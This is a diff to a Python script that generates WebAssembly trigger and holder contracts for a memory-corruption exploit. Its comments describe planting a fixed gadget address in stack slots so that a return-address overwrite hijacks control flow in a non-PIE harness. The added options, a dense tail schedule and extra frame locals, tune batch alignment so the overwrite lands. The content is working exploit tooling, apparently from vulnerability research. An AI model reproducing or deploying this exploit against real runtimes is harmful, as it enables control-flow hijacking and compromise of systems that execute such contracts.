@@ -110,7 +110,7 @@ def gen_holder(outdir, dummy=0):
     print("wrote", p, f"({len(req)}-byte request, {N}-local hit-reporting holder)")
 
 
-def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None):
+def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None, dense_tail=0, frame32=0):
     if plants == "gadget" and plant_addr is not None:
         # aimed pivot: every planted slot = a chosen fixed code address (e.g. a ud2
         # gadget in the non-PIE harness binary) -> a return-slot overwrite transfers
@@ -141,10 +141,13 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
         '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
         '  (func (export "query") (param $env i32) (param $msg i32) (result i32)',
         "    (local $i i32)",
+        ("    " + " ".join(f"(local $f{k} i32)" for k in range(frame32))) if frame32 else "",
+        ("    " + " ".join(f"(local.set $f{k} (i32.const 0))" for k in range(frame32))) if frame32 else "",
         "    (block $exit",
         "      (loop $l",
         "        ;; 16 live values (register pressure) — loaded qwords or computed",
     ]
+    lines = [l for l in lines if l != ""]
     if live == "computed":
         # p1drift-proven shape: computed live values from the loop index
         for _ in range(LIVE):
@@ -164,15 +167,29 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
             "        (call $db_read (i32.const 16))",
             "        drop",
         ]
+    elif dense_tail > 0:
+        # sparse schedule until the last scheduled call, then DENSE for the tail:
+        # the crossing batch's deepest qword (the call return address) lands first;
+        # the dense tail then re-covers the holder's slot region with 16B-step
+        # batches, sweeping every batch qword (incl. the planted GPRs) onto it.
+        dense_from = iters - 1 - dense_tail
+        lines += [
+            f"        (i32.or (i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511))) (i32.gt_u (local.get $i) (i32.const {dense_from})))",
+            "        (if (then (call $db_read (i32.const 16)) drop))",
+        ]
     else:
         lines += [
             f"        (i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511)))",
             "        (if (then (call $db_read (i32.const 16)) drop))",
         ]
+    # keep any frame32 locals live (zero effect) so they stay in the native frame
+    bound = f"(i32.const {iters})"
+    for k in range(frame32):
+        bound = f"(i32.add {bound} (i32.and (local.get $f{k}) (i32.const 0)))"
     lines += [
         "        " + " ".join(["drop"] * LIVE),
         "        (local.set $i (i32.add (local.get $i) (i32.const 1)))",
-        f"        (br_if $l (i32.lt_u (local.get $i) (i32.const {iters})))",
+        f"        (br_if $l (i32.lt_u (local.get $i) {bound}))",
         "      )",
         "    )",
         "    (i32.const 32))",
@@ -222,10 +239,14 @@ def main():
                     help="trigger planted pivot values: all equal, per-slot distinct (slot-ID), or one gadget addr")
     ap.add_argument("--plant-addr", type=lambda s: int(s, 16), default=None,
                     help="fixed address planted in every slot when --plants gadget (hex)")
+    ap.add_argument("--dense-tail", type=int, default=0,
+                    help="after the last sparse call, call every iteration for this many iterations")
+    ap.add_argument("--frame32", type=int, default=0,
+                    help="extra i32 trigger locals (live in the loop) to flip 8B batch alignment parity")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
     gen_holder(args.outdir, args.dummy)
-    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants, args.plant_addr)
+    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants, args.plant_addr, args.dense_tail, args.frame32)
     gen_benign(args.outdir)
 
 
